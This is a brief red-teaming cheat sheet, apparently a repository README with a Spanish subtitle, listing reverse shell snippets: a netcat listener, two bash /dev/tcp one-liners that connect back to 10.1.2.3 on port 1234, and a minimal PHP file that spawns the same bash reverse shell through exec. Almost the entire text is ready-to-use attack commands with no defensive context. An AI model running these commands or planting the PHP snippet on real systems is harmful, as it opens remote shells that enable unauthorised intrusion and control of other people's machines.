# red_cheatsheet
Un torpedo para cosas de red teaming

# Reverse Shells

## Netcat Receiver
```
nc -lvnp [receiving port]
```

## Bash TCP
```
/bin/bash -i >& /dev/tcp/10.1.2.3/1234 0>&1
/bin/bash -l > /dev/tcp/10.1.2.3/1234 0<&1 2>&1
```
[ref](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp)

## Minimal php
```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.1.2.3/1234 0>&1'");
?>
```

[ref](https://gist.github.com/rshipp/eee36684db07d234c1cc)
